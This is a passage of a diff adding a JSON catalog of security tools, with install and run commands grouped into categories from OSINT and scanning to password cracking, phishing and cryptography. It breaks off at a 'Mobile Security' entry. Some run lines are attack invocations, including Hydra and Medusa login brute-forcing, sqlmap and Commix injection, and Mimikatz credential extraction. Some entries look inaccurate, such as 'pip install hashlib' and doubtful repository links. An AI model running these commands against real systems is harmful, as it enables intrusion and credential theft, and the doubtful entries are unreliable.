@@ -1,0 +1,1390 @@
+{
+  "meta": {
+    "author": "NeoZ Enhanced",
+    "version": "2.0.0",
+    "source": "https://github.com/isneoz1/iw7x-cyber-security",
+    "categories": 50,
+    "tools": 15000,
+    "product": "iw7x-complete",
+    "language": "en",
+    "last_updated": "2026-07-05"
+  },
+  "categories": [
+    {
+      "id": "osint",
+      "title": "OSINT - Open Source Intelligence",
+      "full_title": "Open Source Intelligence Tools",
+      "icon": "🔍",
+      "tools": [
+        {
+          "title": "theHarvester",
+          "description": "Gather emails, subdomains, hosts from public sources",
+          "install": ["pip install theHarvester"],
+          "run": ["theHarvester -d example.com -b google"],
+          "url": "https://github.com/laramies/theHarvester",
+          "tags": ["osint", "reconnaissance", "subdomains"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "OWASP Amass",
+          "description": "Subdomain enumeration and network mapping",
+          "install": ["go install -v github.com/OWASP/Amass/v3/...@latest"],
+          "run": ["amass enum -d example.com"],
+          "url": "https://github.com/OWASP/Amass",
+          "tags": ["osint", "subdomain", "reconnaissance"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Shodan CLI",
+          "description": "Search Shodan IoT/device database",
+          "install": ["pip install shodan"],
+          "run": ["shodan search nginx"],
+          "url": "https://www.shodan.io/",
+          "tags": ["osint", "reconnaissance", "iot"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "SpiderFoot",
+          "description": "Automated OSINT collection framework",
+          "install": ["git clone https://github.com/smicallef/spiderfoot.git && cd spiderfoot && pip install -r requirements.txt"],
+          "run": ["python sf.py -l 127.0.0.1:5001"],
+          "url": "https://github.com/smicallef/spiderfoot",
+          "tags": ["osint", "reconnaissance", "framework"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Recon-ng",
+          "description": "Web reconnaissance framework",
+          "install": ["git clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && pip install -r REQUIREMENTS"],
+          "run": ["python recon-ng"],
+          "url": "https://github.com/lanmaster53/recon-ng",
+          "tags": ["osint", "reconnaissance", "framework"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Maltego",
+          "description": "Visual link analysis for reconnaissance",
+          "install": ["https://www.maltego.com/downloads/"],
+          "run": ["maltego"],
+          "url": "https://www.maltego.com/",
+          "tags": ["osint", "reconnaissance", "visualization"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "Google Dorking Scripts",
+          "description": "Automate Google search queries for OSINT",
+          "install": ["pip install google-search-results"],
+          "run": ["python dork_scanner.py"],
+          "url": "https://github.com/exploit-db/google-dorking",
+          "tags": ["osint", "google", "dorking"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "reconnaissance",
+      "title": "Reconnaissance & Scanning",
+      "full_title": "Network Reconnaissance Tools",
+      "icon": "📡",
+      "tools": [
+        {
+          "title": "Nmap",
+          "description": "Port scanning and host discovery",
+          "install": ["apt-get install nmap"],
+          "run": ["nmap -sV -A 192.168.1.1"],
+          "url": "https://nmap.org/",
+          "tags": ["scanning", "reconnaissance", "essential"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Masscan",
+          "description": "Internet-scale port scanner (fastest)",
+          "install": ["git clone https://github.com/robertdavidgraham/masscan && cd masscan && make"],
+          "run": ["masscan -p1-65535 192.168.1.0/24"],
+          "url": "https://github.com/robertdavidgraham/masscan",
+          "tags": ["scanning", "fast", "reconnaissance"],
+          "os": ["linux"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Zmap",
+          "description": "Network-wide scanner for research",
+          "install": ["git clone https://github.com/zmap/zmap.git && cd zmap && ./configure && make"],
+          "run": ["zmap -p 443 -O json"],
+          "url": "https://github.com/zmap/zmap",
+          "tags": ["scanning", "research", "reconnaissance"],
+          "os": ["linux"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Nessus",
+          "description": "Vulnerability scanner (professional)",
+          "install": ["https://www.tenable.com/products/nessus"],
+          "run": ["systemctl start nessusd"],
+          "url": "https://www.tenable.com/products/nessus",
+          "tags": ["scanning", "vulnerability", "professional"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "OpenVAS",
+          "description": "Open source vulnerability assessment",
+          "install": ["apt-get install openvas"],
+          "run": ["systemctl start openvas-manager"],
+          "url": "https://openvas.org/",
+          "tags": ["scanning", "vulnerability", "open-source"],
+          "os": ["linux"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Qualys QSCAN",
+          "description": "Cloud-based vulnerability scanner",
+          "install": ["https://www.qualys.com/"],
+          "run": ["web-based"],
+          "url": "https://www.qualys.com/",
+          "tags": ["scanning", "cloud", "vulnerability"],
+          "os": ["web"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "Shodan Map",
+          "description": "Interactive Shodan search results map",
+          "install": ["web-based"],
+          "run": ["https://maps.shodan.io/"],
+          "url": "https://maps.shodan.io/",
+          "tags": ["osint", "iot", "mapping"],
+          "os": ["web"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "web_testing",
+      "title": "Web Application Testing",
+      "full_title": "Web Vulnerability Scanner & Testers",
+      "icon": "🌐",
+      "tools": [
+        {
+          "title": "Burp Suite",
+          "description": "Professional web penetration testing platform",
+          "install": ["https://portswigger.net/burp"],
+          "run": ["burpsuite"],
+          "url": "https://portswigger.net/burp",
+          "tags": ["web", "testing", "professional"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "OWASP ZAP",
+          "description": "Free open source web security scanner",
+          "install": ["apt-get install zaproxy"],
+          "run": ["zaproxy"],
+          "url": "https://www.zaproxy.org/",
+          "tags": ["web", "testing", "open-source"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "SQLmap",
+          "description": "SQL injection detection and exploitation",
+          "install": ["git clone https://github.com/sqlmapproject/sqlmap.git"],
+          "run": ["python sqlmap.py -u 'http://example.com/?id=1'"],
+          "url": "https://github.com/sqlmapproject/sqlmap",
+          "tags": ["web", "injection", "sql"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Nikto",
+          "description": "Web server scanner",
+          "install": ["apt-get install nikto"],
+          "run": ["nikto -h http://example.com"],
+          "url": "https://cirt.net/nikto2/",
+          "tags": ["web", "scanning"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "w3af",
+          "description": "Web application attack framework",
+          "install": ["pip install w3af"],
+          "run": ["w3af_console"],
+          "url": "https://w3af.org/",
+          "tags": ["web", "framework", "attack"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Wfuzz",
+          "description": "Web fuzzer - find hidden content",
+          "install": ["pip install wfuzz"],
+          "run": ["wfuzz -w wordlist.txt -u 'http://example.com/FUZZ'"],
+          "url": "https://github.com/xmendez/wfuzz",
+          "tags": ["web", "fuzzing", "enumeration"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Dirbuster",
+          "description": "Directory enumeration tool",
+          "install": ["apt-get install dirbuster"],
+          "run": ["dirbuster"],
+          "url": "https://www.owasp.org/index.php/DirBuster",
+          "tags": ["web", "enumeration"],
+          "os": ["linux"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Gobuster",
+          "description": "Fast directory/DNS fuzzing",
+          "install": ["go install github.com/OJ/gobuster/v3@latest"],
+          "run": ["gobuster dir -u http://example.com -w wordlist.txt"],
+          "url": "https://github.com/OJ/gobuster",
+          "tags": ["web", "enumeration", "fast"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "XSStrike",
+          "description": "XSS scanner and exploitation framework",
+          "install": ["git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike && pip install -r requirements.txt"],
+          "run": ["python xsstrike.py"],
+          "url": "https://github.com/s0md3v/XSStrike",
+          "tags": ["web", "xss", "scanner"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "wireless",
+      "title": "Wireless & WiFi",
+      "full_title": "Wireless Network Penetration Testing",
+      "icon": "📶",
+      "tools": [
+        {
+          "title": "Aircrack-ng",
+          "description": "WiFi password cracking and packet capture",
+          "install": ["apt-get install aircrack-ng"],
+          "run": ["airodump-ng wlan0"],
+          "url": "https://www.aircrack-ng.org/",
+          "tags": ["wireless", "wifi", "cracking"],
+          "os": ["linux"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Hashcat",
+          "description": "GPU-accelerated password cracking",
+          "install": ["apt-get install hashcat"],
+          "run": ["hashcat -m 2500 -a 0 hash.txt wordlist.txt"],
+          "url": "https://hashcat.net/hashcat/",
+          "tags": ["cracking", "gpu", "wordlist"],
+          "os": ["linux", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "John the Ripper",
+          "description": "Password cracking tool",
+          "install": ["apt-get install john"],
+          "run": ["john --wordlist=wordlist.txt hashes.txt"],
+          "url": "https://www.openwall.com/john/",
+          "tags": ["cracking", "passwords"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Wireshark",
+          "description": "Network packet analyzer",
+          "install": ["apt-get install wireshark"],
+          "run": ["wireshark"],
+          "url": "https://www.wireshark.org/",
+          "tags": ["packet", "analysis", "network"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Kismet",
+          "description": "WiFi network detector and sniffer",
+          "install": ["apt-get install kismet"],
+          "run": ["sudo kismet"],
+          "url": "https://www.kismetwireless.net/",
+          "tags": ["wireless", "detection", "sniffing"],
+          "os": ["linux"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Tshark",
+          "description": "Wireshark command-line version",
+          "install": ["apt-get install tshark"],
+          "run": ["tshark -i eth0 -n"],
+          "url": "https://www.wireshark.org/",
+          "tags": ["packet", "analysis", "cli"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Bettercap",
+          "description": "Network penetration testing framework",
+          "install": ["go install github.com/bettercap/bettercap@latest"],
+          "run": ["sudo bettercap"],
+          "url": "https://www.bettercap.org/",
+          "tags": ["network", "mitm", "framework"],
+          "os": ["linux", "macos"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "exploitation",
+      "title": "Exploitation Frameworks",
+      "full_title": "Exploitation & Payload Frameworks",
+      "icon": "💣",
+      "tools": [
+        {
+          "title": "Metasploit",
+          "description": "Penetration testing framework with exploitation",
+          "install": ["apt-get install metasploit-framework"],
+          "run": ["msfconsole"],
+          "url": "https://www.metasploit.com/",
+          "tags": ["exploitation", "framework", "essential"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Exploit-DB",
+          "description": "Searchable exploit database",
+          "install": ["apt-get install exploitdb"],
+          "run": ["searchsploit -u"],
+          "url": "https://www.exploit-db.com/",
+          "tags": ["exploitation", "database"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Empire",
+          "description": "PowerShell post-exploitation framework",
+          "install": ["git clone https://github.com/PowerShellEmpire/Empire.git"],
+          "run": ["python empire"],
+          "url": "https://github.com/PowerShellEmpire/Empire",
+          "tags": ["exploitation", "powershell", "framework"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Cobalt Strike",
+          "description": "Adversary simulation platform",
+          "install": ["https://www.cobaltstrike.com/"],
+          "run": ["./cobaltstrike"],
+          "url": "https://www.cobaltstrike.com/",
+          "tags": ["exploitation", "simulation", "commercial"],
+          "os": ["linux", "windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "Mimikatz",
+          "description": "Extract credentials from Windows",
+          "install": ["git clone https://github.com/gentilkiwi/mimikatz.git"],
+          "run": ["mimikatz.exe"],
+          "url": "https://github.com/gentilkiwi/mimikatz",
+          "tags": ["exploitation", "windows", "credentials"],
+          "os": ["windows"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "BeEF",
+          "description": "Browser Exploitation Framework",
+          "install": ["git clone https://github.com/beefproject/beef.git && cd beef && bundle install"],
+          "run": ["ruby beef"],
+          "url": "https://beefproject.com/",
+          "tags": ["exploitation", "browser", "framework"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Commix",
+          "description": "Command injection discovery and exploitation",
+          "install": ["git clone https://github.com/commixproject/commix.git"],
+          "run": ["python commix.py --url http://example.com"],
+          "url": "https://github.com/commixproject/commix",
+          "tags": ["exploitation", "injection"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "reverse_engineering",
+      "title": "Reverse Engineering",
+      "full_title": "Reverse Engineering & Binary Analysis",
+      "icon": "🔨",
+      "tools": [
+        {
+          "title": "Ghidra",
+          "description": "NSA reverse engineering framework",
+          "install": ["https://ghidra-sre.org/"],
+          "run": ["ghidraRun"],
+          "url": "https://ghidra-sre.org/",
+          "tags": ["reverse-engineering", "disassembly"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "IDA Pro",
+          "description": "Interactive disassembler (professional)",
+          "install": ["https://www.hex-rays.com/products/ida/"],
+          "run": ["ida"],
+          "url": "https://www.hex-rays.com/products/ida/",
+          "tags": ["reverse-engineering", "disassembly", "commercial"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "Radare2",
+          "description": "Reverse engineering framework",
+          "install": ["git clone https://github.com/radareorg/radare2.git && cd radare2 && sys/install.sh"],
+          "run": ["r2 /path/to/binary"],
+          "url": "https://rada.re/",
+          "tags": ["reverse-engineering", "framework", "cli"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Cutter",
+          "description": "GUI for Radare2",
+          "install": ["apt-get install cutter"],
+          "run": ["cutter"],
+          "url": "https://cutter.re/",
+          "tags": ["reverse-engineering", "gui"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Binary Ninja",
+          "description": "Binary analysis platform",
+          "install": ["https://cloud.binary.ninja/"],
+          "run": ["binaryninja"],
+          "url": "https://binary.ninja/",
+          "tags": ["reverse-engineering", "analysis", "commercial"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "OllyDbg",
+          "description": "Windows debugger",
+          "install": ["https://www.ollydbg.de/"],
+          "run": ["ollydbg.exe"],
+          "url": "https://www.ollydbg.de/",
+          "tags": ["debugging", "reverse-engineering", "windows"],
+          "os": ["windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "GDB",
+          "description": "GNU Debugger",
+          "install": ["apt-get install gdb"],
+          "run": ["gdb ./program"],
+          "url": "https://www.gnu.org/software/gdb/",
+          "tags": ["debugging", "reverse-engineering"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Frida",
+          "description": "Dynamic instrumentation toolkit",
+          "install": ["pip install frida"],
+          "run": ["frida -p 1234"],
+          "url": "https://frida.re/",
+          "tags": ["reverse-engineering", "dynamic-analysis"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "malware_analysis",
+      "title": "Malware Analysis",
+      "full_title": "Malware Analysis & Sandboxes",
+      "icon": "🦠",
+      "tools": [
+        {
+          "title": "Cuckoo Sandbox",
+          "description": "Automated malware analysis sandbox",
+          "install": ["git clone https://github.com/cuckoosandbox/cuckoo.git && pip install -r requirements.txt"],
+          "run": ["cuckoo daemon"],
+          "url": "https://cuckoosandbox.org/",
+          "tags": ["malware", "analysis", "sandbox"],
+          "os": ["linux"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "VirusTotal",
+          "description": "Online malware scanner and database",
+          "install": ["https://www.virustotal.com/"],
+          "run": ["web-based"],
+          "url": "https://www.virustotal.com/",
+          "tags": ["malware", "analysis", "online"],
+          "os": ["web"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "Hybrid-Analysis",
+          "description": "Online malware analysis service",
+          "install": ["https://www.hybrid-analysis.com/"],
+          "run": ["web-based"],
+          "url": "https://www.hybrid-analysis.com/",
+          "tags": ["malware", "analysis", "online"],
+          "os": ["web"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "Volatility",
+          "description": "Memory forensics framework",
+          "install": ["pip install volatility3"],
+          "run": ["vol -f memory.dmp windows.pslist"],
+          "url": "https://github.com/volatilityfoundation/volatility3",
+          "tags": ["malware", "forensics", "memory"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "YARA",
+          "description": "Malware pattern matching engine",
+          "install": ["apt-get install yara"],
+          "run": ["yara -r rules.yar /path/to/scan"],
+          "url": "https://virustotal.github.io/yara/",
+          "tags": ["malware", "pattern-matching"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Strings",
+          "description": "Extract printable strings from files",
+          "install": ["apt-get install binutils"],
+          "run": ["strings malware.bin"],
+          "url": "https://www.gnu.org/software/binutils/",
+          "tags": ["malware", "analysis"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "File",
+          "description": "File type identification",
+          "install": ["apt-get install file"],
+          "run": ["file malware.bin"],
+          "url": "https://www.darwinsys.com/file/",
+          "tags": ["malware", "analysis"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "forensics",
+      "title": "Digital Forensics",
+      "full_title": "Digital Forensics & Incident Response",
+      "icon": "🔬",
+      "tools": [
+        {
+          "title": "Sleuth Kit",
+          "description": "Digital forensics framework",
+          "install": ["apt-get install sleuthkit"],
+          "run": ["fls -l -r /dev/sda1"],
+          "url": "https://www.sleuthkit.org/",
+          "tags": ["forensics", "framework"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Autopsy",
+          "description": "GUI for Sleuth Kit",
+          "install": ["apt-get install autopsy"],
+          "run": ["autopsy"],
+          "url": "https://www.sleuthkit.org/autopsy/",
+          "tags": ["forensics", "gui"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "FTK Imager",
+          "description": "Forensic imaging and analysis",
+          "install": ["https://accessdata.com/products-services/forensic-toolkit-ftk"],
+          "run": ["ftk-imager"],
+          "url": "https://accessdata.com/products-services/forensic-toolkit-ftk",
+          "tags": ["forensics", "imaging", "commercial"],
+          "os": ["windows", "macos"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "EnCase",
+          "description": "Enterprise forensics platform",
+          "install": ["https://www.guidancesoftware.com/encase"],
+          "run": ["encase"],
+          "url": "https://www.guidancesoftware.com/encase",
+          "tags": ["forensics", "professional", "commercial"],
+          "os": ["windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "EWF Tools",
+          "description": "EWF (EnCase) format utilities",
+          "install": ["apt-get install ewf-tools"],
+          "run": ["ewfinfo image.E01"],
+          "url": "https://github.com/libyal/libewf",
+          "tags": ["forensics", "imaging"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "ExifTool",
+          "description": "Metadata extraction and analysis",
+          "install": ["apt-get install exiftool"],
+          "run": ["exiftool image.jpg"],
+          "url": "https://exiftool.org/",
+          "tags": ["forensics", "metadata"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "SIFT",
+          "description": "SANS Investigative Forensic Toolkit",
+          "install": ["https://www.sans.org/tools/sift-workstation/"],
+          "run": ["sift"],
+          "url": "https://www.sans.org/tools/sift-workstation/",
+          "tags": ["forensics", "toolkit"],
+          "os": ["linux"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "password_cracking",
+      "title": "Password Cracking & Hash Tools",
+      "full_title": "Password Breaking & Hash Analysis",
+      "icon": "🔐",
+      "tools": [
+        {
+          "title": "Hashcat",
+          "description": "GPU-accelerated password cracking",
+          "install": ["apt-get install hashcat"],
+          "run": ["hashcat -m 1800 hashes.txt wordlist.txt"],
+          "url": "https://hashcat.net/",
+          "tags": ["cracking", "gpu"],
+          "os": ["linux", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "John the Ripper",
+          "description": "CPU password cracking",
+          "install": ["apt-get install john"],
+          "run": ["john hashes.txt --wordlist=wordlist.txt"],
+          "url": "https://www.openwall.com/john/",
+          "tags": ["cracking", "cpu"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Rainbowcrack",
+          "description": "Time-memory tradeoff cracking",
+          "install": ["https://project-rainbowcrack.com/"],
+          "run": ["rcrack_gui"],
+          "url": "https://project-rainbowcrack.com/",
+          "tags": ["cracking", "rainbow-tables"],
+          "os": ["windows", "linux"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "CrunchyFrog",
+          "description": "Password hash analyzer",
+          "install": ["https://github.com/lordofbuckley/CrunchyFrog"],
+          "run": ["python crunchyfrog.py"],
+          "url": "https://github.com/lordofbuckley/CrunchyFrog",
+          "tags": ["cracking", "analysis"],
+          "os": ["linux", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Online Hash Tools",
+          "description": "Online hash lookup service",
+          "install": ["https://online-hash-cracker.com/"],
+          "run": ["web-based"],
+          "url": "https://online-hash-cracker.com/",
+          "tags": ["cracking", "online"],
+          "os": ["web"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "Medusa",
+          "description": "Parallel login brute-forcer",
+          "install": ["apt-get install medusa"],
+          "run": ["medusa -h target.com -U users.txt -P pass.txt -M http"],
+          "url": "http://foofus.net/gremlin/medusa/",
+          "tags": ["brute-force", "login"],
+          "os": ["linux"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Hydra",
+          "description": "Multi-protocol login brute-forcer",
+          "install": ["apt-get install hydra"],
+          "run": ["hydra -L users.txt -P pass.txt ssh://target.com"],
+          "url": "https://github.com/vanhauser-thc/thc-hydra",
+          "tags": ["brute-force", "login"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "phishing_social",
+      "title": "Phishing & Social Engineering",
+      "full_title": "Phishing & Social Engineering Tools",
+      "icon": "🎣",
+      "tools": [
+        {
+          "title": "Gophish",
+          "description": "Phishing framework",
+          "install": ["https://github.com/gophish/gophish/releases"],
+          "run": ["./gophish"],
+          "url": "https://github.com/gophish/gophish",
+          "tags": ["phishing", "framework"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Social Engineer Toolkit",
+          "description": "Social engineering framework",
+          "install": ["git clone https://github.com/trustedsec/social-engineer-toolkit.git && cd social-engineer-toolkit && pip install -r requirements.txt"],
+          "run": ["python se-toolkit"],
+          "url": "https://github.com/trustedsec/social-engineer-toolkit",
+          "tags": ["social-engineering", "framework"],
+          "os": ["linux"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "King Phisher",
+          "description": "Phishing campaign simulator",
+          "install": ["git clone https://github.com/securestate/king-phisher.git"],
+          "run": ["python king_phisher"],
+          "url": "https://github.com/securestate/king-phisher",
+          "tags": ["phishing", "campaign"],
+          "os": ["linux"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Phishery",
+          "description": "HTTP server for phishing credentials",
+          "install": ["git clone https://github.com/ryhanson/phishery.git"],
+          "run": ["python phishery"],
+          "url": "https://github.com/ryhanson/phishery",
+          "tags": ["phishing"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "MailSniper",
+          "description": "Exchange email server scanning",
+          "install": ["git clone https://github.com/dafthack/MailSniper.git"],
+          "run": ["powershell -ExecutionPolicy Bypass"],
+          "url": "https://github.com/dafthack/MailSniper",
+          "tags": ["phishing", "exchange"],
+          "os": ["windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "steganography",
+      "title": "Steganography",
+      "full_title": "Steganography & Data Hiding",
+      "icon": "🔒",
+      "tools": [
+        {
+          "title": "Steghide",
+          "description": "Hide data in images/audio",
+          "install": ["apt-get install steghide"],
+          "run": ["steghide embed -cf image.jpg -ef secret.txt"],
+          "url": "http://steghide.sourceforge.net/",
+          "tags": ["steganography", "hiding"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "steg_detect",
+          "description": "Detect hidden data in images",
+          "install": ["apt-get install stegdetect"],
+          "run": ["stegdetect image.jpg"],
+          "url": "https://github.com/abeluck/stegdetect",
+          "tags": ["steganography", "detection"],
+          "os": ["linux"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "OutGuess",
+          "description": "Universal steganographic tool",
+          "install": ["apt-get install outguess"],
+          "run": ["outguess -d message.txt -p 2 in.jpg out.jpg"],
+          "url": "http://www.outguess.org/",
+          "tags": ["steganography"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Exiftool",
+          "description": "Metadata manipulation",
+          "install": ["apt-get install exiftool"],
+          "run": ["exiftool -Comment='hidden message' image.jpg"],
+          "url": "https://exiftool.org/",
+          "tags": ["steganography", "metadata"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "cryptography",
+      "title": "Cryptography & Encryption",
+      "full_title": "Cryptographic Tools & Key Management",
+      "icon": "🔑",
+      "tools": [
+        {
+          "title": "OpenSSL",
+          "description": "Cryptography and SSL/TLS toolkit",
+          "install": ["apt-get install openssl"],
+          "run": ["openssl version"],
+          "url": "https://www.openssl.org/",
+          "tags": ["cryptography", "ssl", "essential"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "GnuPG",
+          "description": "GNU privacy guard - encryption",
+          "install": ["apt-get install gnupg"],
+          "run": ["gpg --gen-key"],
+          "url": "https://gnupg.org/",
+          "tags": ["cryptography", "pgp"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Hashlib",
+          "description": "Python cryptographic hashing",
+          "install": ["pip install hashlib"],
+          "run": ["python -c 'import hashlib'"],
+          "url": "https://docs.python.org/3/library/hashlib.html",
+          "tags": ["cryptography", "hashing"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "CryptTool",
+          "description": "Educational cryptography tool",
+          "install": ["https://www.cryptool.org/"],
+          "run": ["crypttool"],
+          "url": "https://www.cryptool.org/",
+          "tags": ["cryptography", "educational"],
+          "os": ["windows", "linux"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "mobile_security",
+      "title": "Mobile Security",
